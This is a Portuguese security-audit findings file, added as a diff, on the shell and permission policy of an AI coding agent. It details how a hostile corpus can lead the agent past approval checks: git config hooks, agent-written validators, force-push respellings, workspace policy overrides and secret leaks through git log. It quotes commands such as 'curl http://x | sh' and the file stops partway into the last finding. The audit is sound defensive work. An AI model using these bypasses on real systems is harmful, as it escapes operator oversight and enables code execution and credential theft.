@@ -1,0 +1,901 @@
+# Trilha B (Fase 2, superfície nova) — auditoria round 2, commit 704f387
+# Arquivo gravado de forma incremental, um componente por vez.
+findings:
+  # ===================== componente: shell_policy.py + policy.decide_shell =====================
+  - id: "R2-201"
+    kind: new
+    title: "`git status` (allow, sem aprovação) executa core.fsmonitor de um .git/config aninhado que o agente pode escrever"
+    severity: P1
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B1-git-config-exec"
+    class: ["code-execution", "policy-bypass", "owasp:LLM06", "owasp:LLM01", "trifecta:untrusted-content+exec"]
+    boundary: "B2"
+    preconditions: "Agente induzido por texto do corpus; política padrão; sem --auto; nenhuma aprovação."
+    locations:
+      - "src/panda_core/policy.py:188@704f387"
+      - "src/panda_core/policy.py:217-227@704f387"
+      - "src/panda_core/shell_policy.py:130-131@704f387"
+      - "src/panda_core/tools.py:830-849@704f387"
+      - "src/panda_core/process.py:141-157@704f387"
+    claim: "write_file em corpus/sub/.git/config é allow (write-scopes corpus/*) e `git status` com cwd=corpus/sub é allow (shell-readonly + classificador), então o hook core.fsmonitor roda código arbitrário sem nenhuma aprovação."
+    evidence:
+      - {leg: A, method: static, detail: "write-scopes permite corpus/* (policy.py:188); floor-control-plane cobre só .panda/* e corpus/validation/* na raiz (policy.py:339-346). run_shell decide por argv+texto 'git status' -> allow (policy.py:217-227, shell_policy.py:130) e o cwd vem do modelo (tools.py:830). scrubbed_env (process.py:141) não força core.fsmonitor=false/GIT_CONFIG_NOSYSTEM, ao contrário da sonda de TRUST-004."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py::test_git_status_in_agent_writable_nested_repo_runs_no_config_hook", output_excerpt: "AssertionError: ('core.fsmonitor ran without approval', '{\"ok\":true,\"tool\":\"run_shell\",\"argv\":[\"git\",\"status\"],\"cwd\":\"corpus/sub\",...')\n1 failed"}
+    falsification: "Verifiquei que o git 2.43 aceita o .git mínimo (HEAD, objects/, refs/) criado só com write_file e que não há checagem de safe.directory (mesmo dono). Também ocorre com diff.external em `git diff` e textconv em `git log -p` (mesma causa)."
+    impact: "Execução arbitrária de código pelo agente sem aprovação; com o mesmo processo é possível ler o vault do usuário e exfiltrar (trifecta completa). Variante irmã de TRUST-004 na rota run_shell."
+    fix: {approach: "Rodar todo git de run_shell com configuração neutralizada e negar escrita em qualquer `.git/`", sketch: "em run_shell, quando program==git, prefixar `-c core.fsmonitor=false -c diff.external= -c core.pager=cat -c core.hooksPath=/dev/null` e env GIT_CONFIG_NOSYSTEM=1, GIT_CONFIG_GLOBAL=/dev/null; acrescentar ao floor `write/edit` hard_deny para `.git/*`, `*/.git/*`, `.gitattributes`, `*/.gitattributes`; opcionalmente `--no-ext-diff --no-textconv` nos read-only", risk: "baixo; textconv legítimo deixa de rodar", rollback: "remover os -c extras"}
+    tests_to_add: ["tests/security/test_shell_git_config.py::test_git_status_in_agent_writable_nested_repo_runs_no_config_hook"]
+    related: ["TRUST-004", "SEC-001", "SEC-002"]
+  - id: "R2-205"
+    kind: variant
+    title: "`panda validate*` é allow por prefixo de texto: `run_shell panda validate --root corpus/x` executa um validador escrito pelo agente"
+    severity: P1
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B2-text-prefix-allow"
+    class: ["code-execution", "policy-bypass", "owasp:LLM06"]
+    boundary: "B2"
+    preconditions: "Agente induzido; `panda` no PATH do processo (instalação normal); node presente; sem aprovação."
+    locations:
+      - "src/panda_core/policy.py:216-228@704f387"
+      - "src/panda_core/policy.py:449-452@704f387"
+      - "src/panda_core/shell_policy.py:174-197@704f387"
+      - "src/panda_core/policy.py:339-346@704f387"
+      - "src/panda_cli/main.py:378-406@704f387"
+    claim: "O classificador não conhece `panda`, então vale a regra de texto `panda validate*` (allow); o agente grava corpus/x/.panda/config.json e corpus/x/corpus/validation/validate.mjs (fora do floor, que só casa na raiz) e roda `panda validate --root corpus/x` sem aprovação."
+    evidence:
+      - {leg: A, method: static, detail: "shell-readonly inclui 'panda validate*' (policy.py:225); classify_shell retorna None para programas fora de git/rm/find (shell_policy.py:197), então decide_shell devolve a decisão das regras de texto (policy.py:451-452). O floor usa '.panda/*' e 'corpus/validation/*' ancorados na raiz (policy.py:342); 'corpus/x/corpus/validation/validate.mjs' casa 'corpus/*' allow."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py::test_panda_validate_via_run_shell_cannot_run_agent_written_validator", output_excerpt: "AssertionError: ('validator escrito pelo agente rodou sem aprovação', '{\"ok\":false,\"tool\":\"run_shell\",\"argv\":[\"panda\",\"validate\",\"--ro...')\nassert not True  (marcador PWNED_BY_NESTED_VALIDATOR criado pelo node)\n1 failed"}
+    falsification: "Sem o config aninhado, Workspace.load sobe até a raiz e roda o validador legítimo (verifiquei: saída '10 passed'); com ele, roda o JS do agente. `--root /qualquer/caminho` também é aceito pelo mesmo allow."
+    impact: "Derrota SEC-002 (validador não regravável/executável sem aprovação) por uma rota irmã: execução arbitrária de JS sem aprovação."
+    fix: {approach: "Remover allows por prefixo de texto para programas que o classificador não entende", sketch: "tirar 'panda validate*' de shell-readonly (o agente tem a ferramenta validate); em decide_shell, quando classify_shell devolve None, nunca devolver allow (máximo 'ask'); no floor, usar '*/.panda/*' e '*/corpus/validation/*' para write/edit", risk: "baixo", rollback: "restaurar a regra"}
+    tests_to_add: ["tests/security/test_shell_policy.py::test_panda_validate_via_run_shell_cannot_run_agent_written_validator", "tests/security/test_shell_policy.py::test_unclassified_program_is_never_allow"]
+    related: ["SEC-002", "SEC-001", "TRUST-003"]
+  - id: "R2-200"
+    kind: variant
+    title: "`git log -p` / `git show HEAD` (allow) imprimem arquivos secretos versionados; `git show HEAD:.env` é só ask"
+    severity: P1
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B3-readonly-git-content"
+    class: ["secret-exposure", "policy-bypass", "owasp:LLM02", "trifecta:private-data"]
+    boundary: "B3"
+    preconditions: "Histórico git contém um arquivo coberto por read-secrets/read-private-keys (corpus hostil ou commit acidental); agente induzido; sem aprovação. Com --auto, também `git show HEAD:.env`."
+    locations:
+      - "src/panda_core/shell_policy.py:149-171@704f387"
+      - "src/panda_core/policy.py:453-461@704f387"
+      - "src/panda_core/agent.py:541-547@704f387"
+    claim: "O read hard_deny só é aplicado a caminhos posicionais explícitos; sem pathspec, `git log -p` e `git show HEAD` devolvem o conteúdo de .env/id_ed25519 versionados ao modelo e ao provedor, sem aprovação e sem redação."
+    evidence:
+      - {leg: A, method: static, detail: "_read_only só coleta args posicionais como read_paths (shell_policy.py:157-161); 'HEAD:.env' cai em ':' -> ask 'shell-git-path' (shell_policy.py:158-159) em vez de read-secrets. O conteúdo da ferramenta entra em self.messages sem redact (agent.py:541-547)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py::test_git_log_patch_does_not_print_committed_secret_file", output_excerpt: "read_file('.env') -> blocked (hard_deny)\nrun_shell ['git','log','-p'] -> ok:true\n'SYNTH_SECRET' is contained here: @@\\n+DBX=SYNTH_SECRET_ENV_VALUE_123 ... +SYNTH_SECRET_KEY_MATERIAL\n1 failed"}
+    falsification: "Conferi que read_file do mesmo .env é bloqueado no mesmo teste (a política funciona na rota direta). O nome DBX não contém palavra de credencial, então nem a redação do ledger o pegaria."
+    impact: "Segredos versionados chegam ao provedor e à tela, contrariando 'Panda never prints .env contents' (SECURITY.md) e o hard_deny read-secrets."
+    fix: {approach: "Tratar log/show/diff entre commits como leitura de todos os caminhos do diff", sketch: "para log/show/diff sem pathspec, exigir ask; ou anexar pathspecs de exclusão `':(exclude,glob)**/.env' ...` gerados a partir das regras read hard_deny; mapear 'REV:path' para read_paths=[path]", risk: "médio (mais asks)", rollback: "reverter o classificador"}
+    tests_to_add: ["tests/security/test_shell_policy.py::test_git_log_patch_does_not_print_committed_secret_file", "tests/security/test_shell_policy.py::test_git_show_rev_colon_secret_is_hard_denied"]
+    related: ["SEC-003", "SEC-005", "R2-500"]
+  - id: "R2-202"
+    kind: variant
+    title: "Force-push/reset --hard/clean -f/rm -rf viram `ask` com grafias irmãs (opções globais desconhecidas, wrappers com valor, programas wrapper fora da lista)"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B4-classifier-escalate-only"
+    class: ["policy-bypass", "owasp:LLM06"]
+    boundary: "B2"
+    preconditions: "Aprovação do operador (prompt mostra o comando) ou --auto (ask comum é aprovado; ver R2-500)."
+    locations:
+      - "src/panda_core/shell_policy.py:35-41@704f387"
+      - "src/panda_core/shell_policy.py:94-103@704f387"
+      - "src/panda_core/shell_policy.py:180-186@704f387"
+      - "src/panda_core/shell_policy.py:109-123@704f387"
+    claim: "Uma opção global de git fora das listas (--no-replace-objects, --literal-pathspecs, --glob-pathspecs), um wrapper com opção de valor (env -u/-C, sudo -u) ou um wrapper não listado (timeout, stdbuf, setsid, busybox) faz o classificador devolver ask/None, e a regra de texto não casa porque o texto não começa com `git push`; também `-c remote.origin.mirror=true push` e `push --prune` (deleção remota) são só ask."
+    evidence:
+      - {leg: A, method: static, detail: "_git devolve ask 'shell-git-option' para qualquer opção global desconhecida antes de olhar o subcomando (shell_policy.py:102-103); o pulo de wrappers só ignora tokens com '-', '=' ou dígitos (shell_policy.py:182-185), então o valor de -u/-C vira 'programa'; timeout/stdbuf/setsid/busybox não estão em _WRAPPERS (:35). push só testa --force/--mirror/--delete/-d/+/: (:110-116)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py -k spellings", output_excerpt: "(['git', '--no-replace-objects', 'push', '--force', 'origin', 'main'], 'ask', 'shell-default-ask')\n(['git', '--literal-pathspecs', 'reset', '--hard'], 'ask', ...)\n(['env', '-u', 'HOME', 'git', 'push', '--force'], 'ask', ...)\n(['sudo', '-u', 'me', 'git', 'reset', '--hard'], 'ask', ...)\n(['timeout', '60', 'git', 'push', '--force'], 'ask', ...)\n(['busybox', 'rm', '-rf', 'corpus'], 'ask', ...)\n(['git', '-c', 'remote.origin.mirror=true', 'push', 'origin'], 'ask', ...)\n(['git', 'push', '--prune', 'origin', 'refs/heads/*:refs/heads/*'], 'ask', 'shell-push')\n12 failed"}
+    falsification: "sh -c 'git push --force' já é ask por limite conhecido; aqui o defeito é que o próprio classificador, que afirma cobrir wrappers env/sudo (nota SEC-001), falha em formas simples e argv-only. nice -n 5 e git -C . continuam hard_deny (testado)."
+    impact: "C-5 ('destrutivo/force é hard_deny') não vale para grafias triviais; com --auto, execução sem humano."
+    fix: {approach: "Classificar pelo subcomando mesmo com opção global desconhecida e tratar wrappers por tabela de aridade", sketch: "em _git, opção global desconhecida -> continuar a varredura e escalar no fim (max(ask, verdict)); tabela {env: {-u,-C,-S: 1}, sudo: {-u,-g,-C: 1}, timeout: 1 posicional, stdbuf, setsid, ionice, chrt, taskset, flock, busybox (programa = argv[1])}; push: --prune, -c remote.*.mirror/push => hard_deny; após falhar o parse do wrapper -> ask high com never_auto", risk: "baixo", rollback: "reverter tabela"}
+    tests_to_add: ["tests/security/test_shell_policy.py::test_force_and_destructive_spellings_stay_hard_denied"]
+    related: ["SEC-001", "SEC-007", "APR-004", "R2-500"]
+  - id: "R2-204"
+    kind: variant
+    title: "Publicar por outros meios (gh release, twine upload, npm publish, git send-email, gh pr merge) é `ask` comum e --auto aprova"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B5-never-auto-by-rule-name"
+    class: ["excessive-agency", "owasp:LLM06", "trifecta:external-communication"]
+    boundary: "B2"
+    preconditions: "--auto; agente induzido; ferramentas instaladas/autenticadas na máquina do usuário."
+    locations:
+      - "src/panda_cli/runtime.py:44-46@704f387"
+      - "src/panda_cli/runtime.py:119-122@704f387"
+      - "src/panda_core/agent.py:56-58@704f387"
+    claim: "NEVER_AUTO_RULES lista só os três ids de git push; qualquer outro comando de publicação cai em shell-default-ask e é aprovado por --auto, embora o SYSTEM_PROMPT diga que publicar nunca é concedido por --auto."
+    evidence:
+      - {leg: A, method: static, detail: "runtime.py:122 aprova se rule_id não está em {'shell-push','shell-git-push','git-push'}; o classificador só conhece git/rm/find (shell_policy.py:187-197)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py -k publishing", output_excerpt: "6 failed: gh release create / twine upload / npm publish / git send-email / gh pr merge --admin / git remote set-url --push -> decision ask (shell-default-ask), ChatRuntime._approve(auto=True) -> True"}
+    falsification: "CONTRACT §run cita só `git push` como exemplo de never_auto; mas o mesmo parágrafo e o SYSTEM_PROMPT falam em 'publishing'. Mesmo se lido como só-git, é lacuna de projeto."
+    impact: "Publicação/egresso (release, pacote, e-mail de patch, merge) sem humano sob --auto."
+    fix: {approach: "Classe never_auto por efeito, não por id de regra (ver R2-500)", sketch: "ShellVerdict ganha never_auto: bool; tabela de publicadores (gh release|pr merge|repo, twine, npm/pnpm/yarn publish, cargo publish, git send-email, git remote set-url) -> ask high never_auto; _approve consulta decision.never_auto", risk: "baixo", rollback: "flag"}
+    tests_to_add: ["tests/security/test_w4.py::test_auto_mode_does_not_approve_other_publishing_commands"]
+    related: ["R2-500", "APR-004"]
+  - id: "R2-203"
+    kind: new
+    title: "Texto exibido/avaliado (\" \".join(argv)) perde fronteiras de token; policy_check e run_shell divergem; no Windows o caminho string (posix=False) mantém aspas"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B6-tokenization-parity"
+    class: ["parity", "approval-ui"]
+    boundary: "B6"
+    preconditions: "Modelo consulta policy_check/MCP e depois executa a forma argv; ou operador lê o preview juntado."
+    locations:
+      - "src/panda_core/tools.py:834-843@704f387"
+      - "src/panda_core/policy.py:433-439@704f387"
+    claim: "argv ['env','-S','git push --force'] é exibido como 'env -S git push --force', texto que a própria política classifica hard_deny, mas o argv real recebe ask; em Windows decide() usa shlex posix=False e '\"--force\"' entre aspas deixa de ser force."
+    evidence:
+      - {leg: A, method: static, detail: "command_text = ' '.join(argv) é usado como preview e como texto das regras (tools.py:834-843); decide('shell', str) re-tokeniza com shlex.split(posix=os.name!='nt') (policy.py:436)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py -k 'preview or windows_string'", output_excerpt: "AssertionError: (['env', '-S', 'git push --force'], 'ask', 'hard_deny')\nAssertionError: ['git', '-C', '.', 'push', '\"--force\"', 'origin', ...] (decide_shell -> ask)\n2 failed"}
+    falsification: "Windows não foi executado: simulei a tokenização com shlex.split(posix=False) no Linux. O mutante M22 (posix=False) sobreviveu à suíte, confirmando ausência de teste de paridade."
+    impact: "O operador aprova um texto que não representa os tokens reais; o modelo recebe de policy_check uma resposta diferente do que run_shell fará."
+    fix: {approach: "Exibir e avaliar com shlex.join(argv) e testar paridade", sketch: "command_text = shlex.join(argv) (ou subprocess.list2cmdline no Windows); decide('shell', str) usar split_command e remover aspas; teste de propriedade decide_shell(argv)==decide('shell', shlex.join(argv))", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_shell_policy.py::test_text_shown_in_preview_decides_like_the_argv_that_runs", "tests/security/test_shell_policy.py::test_windows_string_tokenization_keeps_quoted_force_hard_denied"]
+    related: ["SEC-001", "APR-003"]
+  - id: "REF-200"
+    kind: refuted
+    title: "Hipótese: `git clean -f` escapa do hard_deny com opção global (mutante M26 sobreviveu)"
+    status: refuted
+    evidence_level: E3
+    root_cause: "RC-B4-classifier-escalate-only"
+    locations: ["src/panda_core/shell_policy.py:126-127@704f387", "src/panda_core/policy.py:247@704f387"]
+    claim: "git -C . clean -f, git --no-pager clean -fdx e git -c x=y clean --force são hard_deny pelo ramo do classificador; sem opção global, a regra de texto 'git clean *-f*' duplica o ramo — por isso M26 sobrevive."
+    evidence:
+      - {leg: A, method: static, detail: "shell_policy.py:126 + regra shell-destructive policy.py:247."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_shell_policy.py -k git_clean_force", output_excerpt: "3 passed"}
+    falsification: "Não é bypass, mas é lacuna de teste: os 3 casos acima matam M26 e devem entrar na suíte. `git --glob-pathspecs clean -fdx` É bypass (coberto por R2-202)."
+    tests_to_add: ["tests/security/test_shell_policy.py::test_git_clean_force_with_global_option_is_hard_denied"]
+  - id: "REF-201"
+    kind: refuted
+    title: "Hipótese: abreviações/refspecs de push (--forc, --force-with-lease, +ref, :ref, --mirr, --del, -d), git.exe, GIT maiúsculo, /usr/bin/git e C:\\...\\git.exe escapam"
+    status: refuted
+    evidence_level: E3
+    locations: ["src/panda_core/shell_policy.py:60-82@704f387", "src/panda_core/shell_policy.py:109-123@704f387"]
+    claim: "Todas essas formas dão hard_deny no caminho argv; leituras de .env por pathspec (inclusive CORPUS/.ENV e *.env) dão hard_deny; --output/--outp/--ext-diff dão deny."
+    evidence:
+      - {leg: A, method: static, detail: "_program normaliza basename/sufixo/minúsculas; _long aceita abreviação >=5; positional + ':' verificados."}
+      - {leg: B, method: executed, command: "python poc/B/scripts/sp.py (100 argv contra decide_shell e decide('shell', str))", output_excerpt: "hard_deny shell-git-push-force | git.exe push -f\nhard_deny shell-git-push-force | GIT push -f\nhard_deny shell-git-reset-hard | C:\\git\\git.exe reset --hard (argv)\nhard_deny read-secrets | git diff -- CORPUS/.ENV\ndeny shell-git-output | git diff --outp=x"}
+    falsification: "Exceções encontradas foram registradas em R2-202/R2-203."
+  - id: "REF-202"
+    kind: refuted
+    title: "Hipótese: `!cmd` do REPL e do cockpit contorna decide_shell/aprovação"
+    status: refuted
+    evidence_level: E2
+    locations: ["src/panda_cli/repl.py:95-103@704f387", "src/panda_cli/cockpit.py:1158-1172@704f387"]
+    claim: "Ambos usam runtime.tools.call('run_shell', {argv}) -> _authorize -> decide_shell e o mesmo approver (agent._approve -> runtime._approve)."
+    evidence:
+      - {leg: A, method: static, detail: "repl.py:102 e cockpit.py:1172 chamam o registry; agent.py:239 liga ctx.approve=self._approve."}
+      - {leg: B, method: independent, detail: "A rota do registry foi exercitada por todos os testes de poc/B/test_b_shell_policy.py (mesma função)."}
+    falsification: "Sob --auto o `!cmd` digitado pelo próprio operador também é auto-aprovado; é coerente com o modo."
+  # ===================== componente: policy.py (floor, baseline, carregamento) =====================
+  - id: "R2-206"
+    kind: variant
+    title: "\"A workspace policy can only tighten\" é falso: um policy.json do corpus transforma todo `ask` fora do floor em `allow` (shell arbitrário, escrita em .git/hooks)"
+    severity: P1
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B7-floor-only-hard-deny"
+    class: ["policy-bypass", "code-execution", "doc-claim-false", "owasp:LLM06", "trifecta:untrusted-content+exec"]
+    boundary: "B1"
+    preconditions: "Corpus hostil com .panda/policy.json; agente induzido; nenhuma aprovação, sem --auto."
+    locations:
+      - "src/panda_core/policy.py:349-359@704f387"
+      - "src/panda_core/policy.py:384-405@704f387"
+      - "src/panda_core/policy.py:424-431@704f387"
+      - "docs/CONTRACT.md:445-450@704f387"
+    claim: "O floor só contém hard_deny; uma regra de workspace `{actions:[*],resources:[*],effect:allow}` faz `python -c ...`, escrita em README.md e em .git/hooks/post-checkout virarem allow sem aprovação, contrariando CONTRACT §8."
+    evidence:
+      - {leg: A, method: static, detail: "policy_floor devolve só regras hard_deny + control-plane (policy.py:358-359); load_policy aceita qualquer regra allow da workspace (policy.py:384-400); matching_rules usa a workspace como fonte única das regras não-floor (policy.py:426), então o default_policy (shell-default-ask, write-default-deny) some."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_policy_floor.py::test_workspace_policy_cannot_turn_asks_into_allows; python poc/B/scripts/h.py", output_excerpt: "AssertionError: {\"ok\":true,\"tool\":\"run_shell\",\"argv\":[\".../python\",\"-c\",\"open('.../PWNED_BY_POLICY_JSON', 'w')...\"]...\nwrite .git/hooks/post-checkout allow corpus-convenience\nwrite README.md allow corpus-convenience\nshell python -c x allow corpus-convenience\nread .env hard_deny read-secrets   (floor ainda vale)"}
+    falsification: "O floor de fato segura segredos, control plane e destrutivos (REF-203); o defeito é o resto (ask->allow), que o contrato promete não ser possível. Pode duplicar o veredito de TRUST-003 da trilha A."
+    impact: "Corpus hostil obtém execução arbitrária e persistência (.git/hooks) sem nenhuma aprovação; também neutraliza R2-500/never_auto porque nada chega a ask."
+    fix: {approach: "Política efetiva = mais severo entre built-in e workspace (workspace só pode subir severidade)", sketch: "em PolicyEngine.decide, calcular d_builtin=_decide(default_policy) e d_ws=_decide(workspace) e devolver max por SEVERITY; ou rejeitar no load qualquer regra allow cujo efeito seja mais permissivo que o built-in para a mesma ação/recurso", risk: "médio: workspaces legítimos que liberam escrita em outras pastas precisam de opt-in em escopo de usuário", rollback: "flag de usuário PANDA_TRUST_WORKSPACE_POLICY"}
+    tests_to_add: ["tests/security/test_w0.py::test_workspace_policy_cannot_turn_asks_into_allows"]
+    related: ["TRUST-003", "R2-500", "R2-201"]
+  - id: "R2-207"
+    kind: new
+    title: "Regra de workspace define `risk` e `reason` exibidos no prompt: push vira risco 'low' (uma tecla só) com texto 'pre-approved'; `risk` não é validado"
+    severity: P2
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B7-floor-only-hard-deny"
+    class: ["approval-ui", "social-engineering", "owasp:LLM01"]
+    boundary: "B1"
+    preconditions: "Corpus hostil com policy.json; operador no cockpit."
+    locations:
+      - "src/panda_core/policy.py:395-398@704f387"
+      - "src/panda_core/policy.py:462-463@704f387"
+      - "src/panda_cli/cockpit.py:232-235@704f387"
+      - "src/panda_cli/cockpit.py:253-254@704f387"
+    claim: "decide_shell devolve a decisão das regras quando o classificador não é mais severo, então risk/reason vêm da regra da workspace; o cockpit só pede o segundo 'y' para risk high/critical."
+    evidence:
+      - {leg: A, method: static, detail: "load_policy aceita risk/reason livres (policy.py:397-398); decide_shell retorna base com risk da regra (policy.py:462-463) mesmo com veredito do classificador 'high'; ApprovalScreen._high_risk usa request.risk (cockpit.py:253-254); request.risk é anexado sem sanitize_display (cockpit.py:233)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_policy_floor.py -k risk", output_excerpt: "AssertionError: ('low', 'routine sync to the lab mirror (pre-approved)\\x1b]52;c;eA==\\x07')\nFailed: DID NOT RAISE ConfigError   (risk '\\x1b[2Jnone' aceito)\n2 failed"}
+    falsification: "reason passa por sanitize_display no modal (cockpit.py:235), então o OSC não é emitido; o texto enganoso e o risco rebaixado continuam. O campo risk (cockpit.py:233) não é sanitizado — ver seção display."
+    impact: "C-4 (confirmação dupla para alto risco) contornado por dado do corpus; operador vê 'pre-approved'."
+    fix: {approach: "risk = max(risco da regra, risco do classificador); validar risk em {low,medium,high,critical}; rotular no prompt que reason vem da workspace", sketch: "em decide_shell, se verdict existe, risk=max_risk(base.risk, verdict.risk); load_policy: if risk not in _RISKS: raise ConfigError", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w4.py::test_workspace_rule_cannot_lower_risk_or_rewrite_reason_of_a_push", "tests/test_policy.py::test_policy_loader_rejects_unknown_risk"]
+    related: ["APR-002", "UI-001", "R2-206"]
+  - id: "R2-208"
+    kind: new
+    title: "Lista de arquivos de credencial do floor omite formatos comuns (.envrc, terraform.tfstate, .kube/config, .vault-token, .my.cnf, application_default_credentials.json, .s3cfg, .htpasswd, .aws/config)"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B8-denylist"
+    class: ["secret-exposure", "hardening", "owasp:LLM02"]
+    boundary: "B3"
+    preconditions: "Arquivo desses tipos no workspace; agente induzido; sem aprovação (read-default é allow)."
+    locations: ["src/panda_core/policy.py:145-184@704f387"]
+    claim: "decide('read', p) == allow para 10 de 11 nomes de credencial comuns testados."
+    evidence:
+      - {leg: A, method: static, detail: "read-default allow '*' (policy.py:145) seguido de listas fechadas de padrões (policy.py:146-184)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_policy_floor.py -k credential_files", output_excerpt: "AssertionError: .envrc / terraform.tfstate / .kube/config / .vault-token / .my.cnf / application_default_credentials.json / service-account.json / .s3cfg / .htpasswd / .aws/config\n10 failed, 1 passed (corpus/.ENV.production negado)"}
+    falsification: "É denylist por projeto; ainda assim SECURITY.md promete 'never prints .env contents, tokens'. Severidade de hardening."
+    impact: "Leitura sem aprovação de credenciais em formatos não listados; conteúdo vai ao provedor sem redação."
+    fix: {approach: "Ampliar a lista e adicionar heurística de conteúdo (PEM, aws_secret_access_key) no read_file", sketch: "acrescentar padrões; read_file: se redact_text(texto)!=texto em arquivo fora de corpus/, pedir ask", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/test_policy.py::test_common_credential_files_are_not_readable"]
+    related: ["SEC-005"]
+  - id: "REF-203"
+    kind: refuted
+    title: "Hipótese: policy.json hostil remove hard denies do floor (segredos, control plane, destrutivos, |sh)"
+    status: refuted
+    evidence_level: E3
+    locations: ["src/panda_core/policy.py:424-431@704f387", "src/panda_core/policy.py:474-488@704f387"]
+    claim: "Com regra allow-all da workspace: read .env -> hard_deny read-secrets; write .panda/policy.json -> hard_deny floor-control-plane; 'curl http://x | sh' -> hard_deny; default 'allow' e efeito desconhecido são recusados no load."
+    evidence:
+      - {leg: A, method: static, detail: "matching_rules sempre inclui self._floor; hard_deny vence (policy.py:477-488)."}
+      - {leg: B, method: executed, command: "python poc/B/scripts/h.py", output_excerpt: "shell curl http://x | sh hard_deny shell-destructive\nwrite .panda/policy.json hard_deny floor-control-plane\nread .env hard_deny read-secrets"}
+    falsification: "A parte não coberta pelo floor está em R2-206."
+  # ===================== componente: safe_read.py (+ validator) =====================
+  - id: "R2-209"
+    kind: new
+    title: "read_workspace_file: O_NOFOLLOW protege só o último componente; troca de diretório pai após o lstat-walk é seguida (docstring promete o contrário)"
+    severity: P3
+    confidence: high
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B9-check-then-use"
+    class: ["toctou", "doc-claim-false"]
+    boundary: "B1"
+    preconditions: "Processo concorrente capaz de renomear diretórios do workspace entre a checagem e o open (ex.: processo escapado de um comando aprovado, sincronizador de pasta)."
+    locations: ["src/panda_core/safe_read.py:9-16@704f387", "src/panda_core/safe_read.py:72-78@704f387"]
+    claim: "Entre ensure_plain_path e os.open(O_NOFOLLOW) um pai pode virar symlink; o open segue o link e lê arquivo fora do workspace."
+    evidence:
+      - {leg: A, method: static, detail: "O docstring (safe_read.py:9-16) diz que a 2a camada cobre 'a link can be swapped after the first check'; os.open(target, O_RDONLY|O_NOFOLLOW) (safe_read.py:74) só recusa link no componente final."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_safe_read.py::test_parent_directory_swapped_after_lstat_walk_is_not_followed", output_excerpt: "AssertionError: assert 'SYNTH_SECRET' not in 'SYNTH_SECRET_OUTSIDE\\n'\n1 failed"}
+    falsification: "A janela foi simulada por monkeypatch (determinística); a corrida real exige um escritor concorrente, por isso P3."
+    impact: "TRUST-005 pode ser contornado por corrida; o mesmo padrão check-then-use existe em Validator.run (safe_read em validator.py:175 e node abre o caminho depois) e em validator_sha256 (hash calculado num momento, executado em outro)."
+    fix: {approach: "Abrir componente a componente com openat(dir_fd, name, O_NOFOLLOW|O_DIRECTORY)", sketch: "fd=os.open(root,O_DIRECTORY); for part in parts[:-1]: fd=os.open(part,O_RDONLY|O_DIRECTORY|O_NOFOLLOW,dir_fd=fd); final=os.open(name,O_RDONLY|O_NOFOLLOW,dir_fd=fd); para o validador, copiar o script verificado para um tmp e executar a cópia (hash = bytes executados)", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w0.py::test_parent_directory_swapped_after_lstat_walk_is_not_followed"]
+    related: ["TRUST-005", "SEC-002"]
+  - id: "R2-210"
+    kind: new
+    title: "Validador protegido, dependências não: import de pacote resolve para corpus/node_modules (gravável) e `validate` (allow) executa código do agente"
+    severity: P2
+    confidence: medium
+    status: confirmed
+    evidence_level: E3
+    root_cause: "RC-B10-validator-closure"
+    class: ["code-execution", "policy-bypass", "owasp:LLM06"]
+    boundary: "B2"
+    preconditions: "O validador do corpus importa um especificador nu (pacote) ou relativo fora de corpus/validation (ex.: '../lib/x.mjs'); agente induzido; sem aprovação."
+    locations: ["src/panda_core/policy.py:339-346@704f387", "src/panda_core/policy.py:128-137@704f387", "src/panda_core/validator.py:171-188@704f387"]
+    claim: "O floor só protege corpus/validation/*; a resolução de módulos do Node sobe para corpus/node_modules, onde write_file é allow, e a ação validate é allow pela baseline."
+    evidence:
+      - {leg: A, method: static, detail: "floor-control-plane resources ['.panda/*','corpus/validation/*'] (policy.py:342); validate-default allow (policy.py:128-137); Validator.run executa node no cwd do workspace sem --experimental-policy/--no-addons nem NODE_PATH controlado (validator.py:181-188)."}
+      - {leg: B, method: executed, command: "pytest poc/B/test_b_safe_read.py::test_validator_bare_import_cannot_resolve_to_agent_writable_node_modules", output_excerpt: "AssertionError: validate (allow) executou código de corpus/node_modules\n1 failed"}
+    falsification: "Depende do validador real importar algo; o validador de referência (DCJ) não foi inspecionado [memory: unverified]. Com o fixture padrão (sem imports) não reproduz, daí confidence medium."
+    impact: "Execução de código sem aprovação a cada validate; o validator_sha256 no ledger não muda, então a proveniência afirma que o validador era o mesmo."
+    fix: {approach: "Tratar o fecho de dependências como control plane", sketch: "floor write/edit hard_deny para 'corpus/node_modules/*', '*/node_modules/*', '*/package.json'; rodar node com --disable-proto e cwd=corpus/validation; registrar hash de corpus/validation/** + lockfile", risk: "baixo", rollback: "trivial"}
+    tests_to_add: ["tests/security/test_w3.py::test_validator_bare_import_cannot_resolve_to_agent_writable_node_modules"]
+    related: ["SEC-002", "R2-205"]
+  - id: "R2-211"
+    kind: new
